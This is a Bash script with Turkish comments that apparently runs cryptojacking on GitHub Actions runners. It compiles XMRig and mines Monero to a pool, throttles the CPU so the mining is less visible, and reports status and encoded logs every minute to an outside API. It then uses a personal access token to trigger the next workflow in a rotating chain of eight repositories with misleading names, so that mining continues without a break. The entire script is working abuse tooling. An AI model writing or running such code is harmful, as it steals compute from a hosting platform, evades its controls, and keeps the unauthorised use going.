#!/bin/bash
set -x 

# --- KİMLİK VE AYARLAR ---
CURRENT_ID=${WORKER_ID:-1} 
WORKER_NAME="OBSIDIAN_W_$CURRENT_ID"
API_URL="https://miysoft.com/monero/prime_api_xmr.php"
POOL="pool.supportxmr.com:3333"

# GitHub Kullanıcı Adın ve Repoların
GITHUB_USER="workstation778"
REPOS=("Obsidian-Stealth-Core" "Spectre-Privacy-Node" "Phantom-Hash-Relay" "Wraith-Silent-Grid" "Eclipse-Dark-Flow" "Abyss-Deep-Sync" "Void-Zero-Trace" "Shadow-Ops-Link")

echo "### PROJECT OBSIDIAN NODE $CURRENT_ID BAŞLATILIYOR ###"

# --- ADIM 1: XMRIG DERLEME ---
START_COMPILE=$SECONDS
echo "📦 Bağımlılıklar kuruluyor..."
sudo apt-get update > /dev/null
sudo apt-get install -y git build-essential cmake libuv1-dev libhwloc-dev > /dev/null

echo "⬇️ XMRig kaynak kodu indiriliyor..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build

echo "⚙️ CMake ile yapılandırılıyor..."
cmake ..
echo "🛠️ Derleme başlıyor (Bu işlem 5-10 dk sürebilir)..."
make -j$(nproc)
XMRIG_PATH="./xmrig"
if [ ! -f "$XMRIG_PATH" ]; then
    echo "❌ Derleme başarısız oldu!"
    exit 1
fi
ELAPSED_COMPILE=$((SECONDS - START_COMPILE))
echo "✅ XMRig derlendi: $ELAPSED_COMPILE saniye sürdü."

# --- ADIM 2: MADENCİLİK BAŞLAT ---
RAND_ID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 4 | head -n 1)
MY_MINER_NAME="GHA_${CURRENT_ID}_${RAND_ID}"
touch miner.log && chmod 666 miner.log

echo "🚀 Madenci ateşleniyor: $MY_MINER_NAME"
sudo nohup $XMRIG_PATH -o $POOL -u $WALLET_XMR -p $MY_MINER_NAME -a rx/0 -t 2 --log-file=miner.log > /dev/null 2>&1 &
MINER_PID=$!
sleep 15
sudo cpulimit -p $MINER_PID -l 140 & > /dev/null 2>&1

# --- ADIM 3: İZLEME VE RAPORLAMA (5 Saat 30 Dakika) ---
# Derleme süresini hesaba katarak döngüyü biraz kısa tutuyoruz
MINING_DURATION=19800 
START_LOOP=$SECONDS
while [ $((SECONDS - START_LOOP)) -lt $MINING_DURATION ]; do
    
    if ! ps -p $MINER_PID > /dev/null; then
        sudo nohup $XMRIG_PATH -o $POOL -u $WALLET_XMR -p $MY_MINER_NAME -a rx/0 -t 2 --log-file=miner.log > /dev/null 2>&1 &
        MINER_PID=$!
        sudo cpulimit -p $MINER_PID -l 140 &
    fi

    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    LOGS_B64=$(tail -n 15 miner.log | base64 -w 0)

    JSON_DATA=$(jq -n \
                  --arg wid "$WORKER_NAME" \
                  --arg cpu "$CPU" \
                  --arg ram "$RAM" \
                  --arg st "MINING_XMR" \
                  --arg log "$LOGS_B64" \
                  '{worker_id: $wid, cpu: $cpu, ram: $ram, status: $st, logs: $log}')

    curl -s -o /dev/null -X POST \
         -H "Content-Type: application/json" \
         -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "$JSON_DATA" \
         $API_URL
    
    sleep 60
done

# --- ADIM 4: GÖREV DEVRİ (TRIGGER) ---
echo "✅ Vardiya Bitti. Madenci durduruluyor..."
sudo kill $MINER_PID

NEXT_ID=$((CURRENT_ID + 2))
if [ "$NEXT_ID" -gt 8 ]; then
    NEXT_ID=$((NEXT_ID - 8))
fi

TARGET_REPO=${REPOS[$((NEXT_ID-1))]}
echo "🔄 Tetiklenen Yeni Düğüm: ID $NEXT_ID -> Repo: $TARGET_REPO"

curl -s -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     "https://api.github.com/repos/$GITHUB_USER/$TARGET_REPO/dispatches" \
     -d "{\"event_type\": \"obsidian_loop\", \"client_payload\": {\"worker_id\": \"$NEXT_ID\"}}"

echo "👋 Çıkış yapılıyor."
exit 0
